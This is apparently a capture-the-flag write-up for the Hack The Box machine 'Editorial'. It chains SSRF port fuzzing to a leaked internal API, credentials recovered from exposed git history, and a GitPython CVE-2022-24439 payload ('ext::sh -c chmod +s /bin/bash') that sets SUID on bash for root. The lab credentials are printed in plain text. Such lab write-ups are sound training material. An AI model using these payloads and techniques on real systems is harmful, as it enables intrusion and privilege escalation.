---
icon: ubuntu
---

# Editorial - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   34.72 ms 10.10.16.1
2   86.34 ms editorial.htb (10.10.11.20)
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

Upon visiting the site we get a redirect to editorial.htb I'll add it to my hosts file

```bash
10.10.11.20     editorial.htb
```

<figure><img src="../../.gitbook/assets/image (2798).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2799).png" alt=""><figcaption></figcaption></figure>

On the Publish with us page there seems to be a form that can take a url. I will setup a simple http.server to test and see if It can reach my machine.

<figure><img src="../../.gitbook/assets/image (2800).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2801).png" alt=""><figcaption></figcaption></figure>

It does! Let's open up burpsuite and further inspect this:

<figure><img src="../../.gitbook/assets/image (2802).png" alt=""><figcaption></figcaption></figure>

When trying the localhost port 80 it hangs for a good 10 seconds

<figure><img src="../../.gitbook/assets/image (2803).png" alt=""><figcaption></figcaption></figure>

I'll save the POST request to a file and FUZZ to see if there are any other open ports on the machine

<figure><img src="../../.gitbook/assets/image (2806).png" alt=""><figcaption></figcaption></figure>

in Burp, right click -> Copy to file

#### Fuzzing for open ports

{% code overflow="wrap" %}
```bash
ffuf -u http://editorial.htb/upload-cover -request upload-cover.req -w <( seq 0 65535) -ac
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2807).png" alt=""><figcaption></figcaption></figure>

We discover port 5000 to be open!&#x20;

The request works instantly as well and we are getting data back

<figure><img src="../../.gitbook/assets/image (2809).png" alt=""><figcaption></figcaption></figure>

This looks like an endpoint.

{% code overflow="wrap" %}
```bash
curl http://editorial.htb/static/uploads/cb53b08d-557b-4eea-a7df-0d713a5d9bbe -s | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2810).png" alt=""><figcaption></figcaption></figure>

This is a list of API Endpoints. Let's check them out!

The endpoint with the most interesting information is:

```
/api/latest/metadata/messages/authors
```

<figure><img src="../../.gitbook/assets/image (2811).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
curl http://editorial.htb/static/uploads/f40b3ce9-34f5-4f69-99a5-e623d95ed55f -s | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2812).png" alt=""><figcaption></figcaption></figure>

it contains a username and password!

Testing the creds we discover we have ssh access

```bash
netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'
```

<figure><img src="../../.gitbook/assets/image (2813).png" alt=""><figcaption></figcaption></figure>

We have ssh access! Let's ssh as dev

```bash
ssh dev@editorial.htb
```

<figure><img src="../../.gitbook/assets/image (2814).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2815).png" alt=""><figcaption></figcaption></figure>

We have another user besides `dev` and `root`. Maybe we can find some credentials for `prod`

<figure><img src="../../.gitbook/assets/image (2816).png" alt=""><figcaption></figcaption></figure>

there is a `.git` directory in dev's apps folder.

Surprisingly the application is not here, it must have been deleted and they must have forgotten to check if the the .git directory was deleted

<figure><img src="../../.gitbook/assets/image (2818).png" alt=""><figcaption></figcaption></figure>

There is an interesting commit let's take a look at what has been changed!

```bash
git diff 1e84a03 b73481b
```

<figure><img src="../../.gitbook/assets/image (2819).png" alt=""><figcaption></figcaption></figure>

The password for the prod user is here! Let's ssh as him

```
prod:080217_Producti0n_2023!@
```

<figure><img src="../../.gitbook/assets/image (2820).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2821).png" alt=""><figcaption></figcaption></figure>

The prod user can run a python script with root privileges.&#x20;

<figure><img src="../../.gitbook/assets/image (2822).png" alt=""><figcaption></figcaption></figure>

the script changes directory to `/opt/internal_apps/clone_changes` and takes a URL to clone from

<figure><img src="../../.gitbook/assets/image (2823).png" alt=""><figcaption></figcaption></figure>

The script is also running the Python Git package [**GitPython**](https://github.com/gitpython-developers/GitPython) version 3.1.29

### <mark style="color:$primary;">GitPython 3.1.29 CVE 2022-24439 RCE</mark>

A google search reveals the following CVE

<figure><img src="../../.gitbook/assets/image (2825).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/gitpython-developers/GitPython/issues/1515" %}

<figure><img src="../../.gitbook/assets/image (2826).png" alt=""><figcaption></figcaption></figure>

We can use this to run commands as root. I am going to set the SUID on bash for easy privesc

{% code overflow="wrap" %}
```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c chmod% +s% /bin/bash"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2827).png" alt=""><figcaption></figcaption></figure>

And we are root!
